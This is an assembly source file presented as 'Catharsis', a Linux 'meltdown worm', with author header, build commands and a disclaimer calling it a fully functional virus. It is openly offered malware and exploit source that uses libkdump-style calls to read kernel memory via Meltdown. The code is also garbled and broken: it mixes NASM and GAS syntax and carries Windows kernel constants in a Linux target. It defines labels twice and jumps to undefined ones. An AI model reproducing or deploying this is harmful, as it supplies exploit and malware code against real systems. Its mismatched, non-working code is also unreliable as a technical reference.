;; Catharsis
;;
;; A parasitic meltdown worm
;; Coded by 'HaZel' Timo Sarkar
;; Mostly compiled by gcc with C as host language
;;
;; General sheet of characteristics:
;;    Name of the virus.............: Catharsis
;;    Author........................: Timo 'HaZeL' Sarkar / December 2020
;;    Size..........................: On 1st generation: aprox. 16800 bytes
;;    Targets.......................: Linux only... sorry for that // What in Linux are you targetting? 
;;    Encrypted.....................: No // If you are using polymorphic techniques you need to have a polymorphic engine so it has a chance to be encrypted. Otherwise the purpose of polymorphic techniques are worthless within this code.
;;    Polymorphic...................: Yes
;;    Metamorphic...................: Yes
;;    Payloads......................: Yes: Stdout
;;
;; To do in next versions: Find bugs and add more comments / work on KASLR
;;
;; To build locally:
;;    $ nasm -fwin32 catharsis.asm
;;    $ gcc catharsis.obj -o catharsis.out
;;    $ chmod a+x catharsis.out
;;    $ ./catharsis.out
;;
;; Quick reference (keyword search):
;;    Variable declaration........................: $define && equ
;;    Beginning of virus..........................: .main:
;;    Meltdown....................................: .dbload:
;;    Cache-resulation............................: .resolution
;;
.file	"catharsis.asm"
	%define X86default_offset	0xffff880000000000ull
	%define default_offset		0xc0000000ull
	%define SZ_STACK			1000
	%define SZ_EHDR				564
	%define SZ_MMAP				24
	%define ELF					464c457fh
	%define PT_LOAD				1
	%define PT_DYNAMIC			2
	%define PT_PHDR				6
	%define TEXT_SECT			2
	%define DATA_SECT			3
	%define E_ENTRY				0x18
	%define SYS_READDIR			89
	%define SYS_READ			3
	%define SYS_WRITE			4
	%define SYS_OPEN			5
	%define SYS_CLOSE			6
	%define SYS_UNLINK			10 
	%define SYS_LSEEK			19
	%define SYS_MMAP			90
	%define SYS_MUNMAP			91
	%define SYS_FTRUNCATE		93
	%define SYS_FSTAT			108

	.data
	STATUS_SUCCESS                  equ 000000000h
	STATUS_UNSUCCESSFUL             equ 0C0000001h
	STATUS_NOT_IMPLEMENTED          equ 0C0000002h
	STATUS_IMAGE_NOT_AT_BASE        equ 040000003h
	;; bugcheck code:
	POWER_FAILURE_SIMULATE          equ 0000000E5h
	;; major function codes for IRPs:
	IRP_MJ_CREATE                   equ 00h
	IRP_MJ_CREATE_NAMED_PIPE        equ 01h
	IRP_MJ_CLOSE                    equ 02h
	IRP_MJ_READ                     equ 03h
	IRP_MJ_WRITE                    equ 04h
	IRP_MJ_QUERY_INFORMATION        equ 05h
	IRP_MJ_SET_INFORMATION          equ 06h
	IRP_MJ_QUERY_EA                 equ 07h
	IRP_MJ_SET_EA                   equ 08h
	IRP_MJ_FLUSH_BUFFERS            equ 09h
	IRP_MJ_QUERY_VOLUME_INFORMATION equ 0Ah
	IRP_MJ_SET_VOLUME_INFORMATION   equ 0Bh
	IRP_MJ_DIRECTORY_CONTROL        equ 0Ch
	IRP_MJ_FILE_SYSTEM_CONTROL      equ 0Dh
	IRP_MJ_DEVICE_CONTROL           equ 0Eh
	IRP_MJ_INTERNAL_DEVICE_CONTROL  equ 0Fh
	IRP_MJ_SHUTDOWN                 equ 10h
	IRP_MJ_LOCK_CONTROL             equ 11h
	IRP_MJ_CLEANUP                  equ 12h
	IRP_MJ_CREATE_MAILSLOT          equ 13h
	IRP_MJ_QUERY_SECURITY           equ 14h
	IRP_MJ_SET_SECURITY             equ 15h
	IRP_MJ_POWER                    equ 16h
	IRP_MJ_SYSTEM_CONTROL           equ 17h
	IRP_MJ_DEVICE_CHANGE            equ 18h
	IRP_MJ_QUERY_QUOTA              equ 19h
	IRP_MJ_SET_QUOTA                equ 1Ah
	IRP_MJ_PNP                      equ 1Bh
	IRP_MJ_PNP_POWER                equ IRP_MJ_PNP
	IRP_MJ_MAXIMUM_FUNCTION         equ 1Bh
	;; values for the Attributes field:
	OBJ_INHERIT                     equ 00000002h
	OBJ_PERMANENT                   equ 00000010h
	OBJ_EXCLUSIVE                   equ 00000020h
	OBJ_CASE_INSENSITIVE            equ 00000040h
	OBJ_OPENIF                      equ 00000080h
	OBJ_OPENLINK                    equ 00000100h
	OBJ_KERNEL_HANDLE               equ 00000200h
	OBJ_VALID_ATTRIBUTES            equ 000003F2h
	NtCurrentProcess                equ -1
	NtCurrentThread                 equ -2
	;;  enum) pool type:
	NonPagedPool                    equ 0
	PagedPool                       equ 1
	;; (enum) lock operation:
	IoReadAccess                    equ 0
	IoWriteAccess                   equ 1
	IoModifyAccess                  equ 2
	;; (enum) mode:
	KernelMode                      equ 0
	UserMode                        equ 1
	MaximumMode                     equ 2
	STANDARD_RIGHTS_REQUIRED        equ 000F0000h
	FILE_DIRECTORY_FILE             equ 00000001h
	FILE_SYNCHRONOUS_IO_NONALERT    equ 020h
	FileStandardInformation         equ 5

	.text
	.section	.rodata
	.align 8

.payload:
	.string	"Catharsis meltdown worm developed by Timo Sarkar\n"
	.string "Catharsis activated. have a nice day!"
	.align 8

.privileges:
	.string	"\033[31;1m[!]\033[0m Catharsis requires root privileges (or read access to /proc/<pid>/pagemap)!"
	.align 8

.resolution:
	.string	"\r\033[32;1m[+]\033[0m Physical cache resolution: \033[33;1m0x%zx\033[0m\n"

.dbload:
	.string	"\r\033[34;1m[%c]\033[0m 0x%zx    "

.formatting:
	.string	"/-\\|"
	.text
	.globl	main
	.type	main, @function

main:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	leaq	-32768(%rsp), %r11

.LPSRL0:
	subq	$4096, %rsp
	orq	$0, (%rsp)
	cmpq	%r11, %rsp
	jne	.LPSRL0
	addq	$-128, %rsp
	movl	%edi, -32884(%rbp)
	movq	%rsi, -32896(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	leaq	.payload(%rip), %rdi
	call	puts@PLT
	movabsq	$-131941395333120, %rax
	movq	%rax, -32856(%rbp)
	movabsq	$34359738368, %rax
	movq	%rax, -32872(%rbp)
	movq	-32872(%rbp), %rdx
	movl	$0, %eax
	subq	%rdx, %rax
	addq	%rax, %rax
	movq	%rax, -32864(%rbp)
	movl	$0, -32880(%rbp)
	movl	$0, %edi
	call	dump_enable_debug@PLT
	leaq	-32832(%rbp), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	dump_get_autoconfig@PLT
	movl	$10, -32804(%rbp)
	movl	$1, -32820(%rbp)
	subq	$8, %rsp
	pushq	-32800(%rbp)
	pushq	-32808(%rbp)
	pushq	-32816(%rbp)
	pushq	-32824(%rbp)
	pushq	-32832(%rbp)
	call	dump_init@PLT
	addq	$48, %rsp
	leaq	-32784(%rbp), %rax
	addq	$16384, %rax
	movq	%rax, -32848(%rbp)
	movq	-32848(%rbp), %rax
	movb	$88, (%rax)
	movq	-32848(%rbp), %rax
	movq	%rax, %rdi
	call	dump_virt_to_phys@PLT
	movq	%rax, -32840(%rbp)
	cmpq	$0, -32840(%rbp)

	jne	.resolution
	leaq	.privileges(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT

.resolution:
	movq	-32848(%rbp), %rax
	movb	$88, (%rax)
	movq	-32848(%rbp), %rax
	movb	$88, (%rax)
	movq	-32848(%rbp), %rax
	movb	$88, (%rax)
	movq	-32848(%rbp), %rax
	movb	$88, (%rax)
	movq	-32848(%rbp), %rax
	movb	$88, (%rax)
	movq	-32840(%rbp), %rdx
	movq	-32856(%rbp), %rax
	addq	%rax, %rdx
	movq	-32864(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, %rdi
	call	dump_read@PLT
	movl	%eax, -32876(%rbp)
	cmpl	$88, -32876(%rbp)

	jne	.dbload
	movq	-32856(%rbp), %rdx
	movq	-32864(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, %rsi
	leaq	.privileges(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	stdout(%rip), %rax
	movq	%rax, %rdi
	call	fflush@PLT
	nop
	movl	$0, %eax
	call	dump_cleanup@PLT
	movl	$0, %eax
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	
	je	.space7
	jmp	.space8

.dbload:
	movq	-32872(%rbp), %rax
	addq	%rax, -32864(%rbp)
	movq	-32856(%rbp), %rax
	notq	%rax
	cmpq	%rax, -32864(%rbp)
	jb	.space5
	movq	$0, -32864(%rbp)
	shrq	$4, -32872(%rbp)

.space5:
	movq	-32856(%rbp), %rdx
	movq	-32864(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	movl	-32880(%rbp), %eax
	leal	1(%rax), %edx
	movl	%edx, -32880(%rbp)
	movslq	%eax, %rdx
	imulq	$1374389535, %rdx, %rdx
	shrq	$32, %rdx
	sarl	$7, %edx
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sarl	$31, %eax
	shrl	$30, %eax
	addl	%eax, %edx
	andl	$3, %edx
	subl	%eax, %edx
	movl	%edx, %eax
	cltq

	leaq	.dbload(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movsbl	%al, %eax
	movq	%rcx, %rdx
	movl	%eax, %esi

	leaq	.formatting(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L2

.space8:
	call	__stack_chk_fail@PLT

.space7:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc

.LFE6:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5

0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
;; (c) Timo Sarkar HaZeL, somewhere on December 2020                         
;;
;; DISCLAIMER
;;
;; This code is only for research and educational purposes only. The assembling
;; of this file will produce a fully functional virus, so you have been warned.
;; If this kind of material is illegal in your country or state, you should
;; remove it from your computer. The author of this virus declines any illegal
;; activity performed by the possesor of the assembled form of this source code
;; including possesion and/or spreading of the virus generated from this source
;; code.
;;
;; This source code is provided "as is". The deliberated modification of this
;; source code will derive in a new virus that must not be considered the virus
;; sourced here. The author of the original source code will not be considered
;; the author of the new modified or derivated virus.
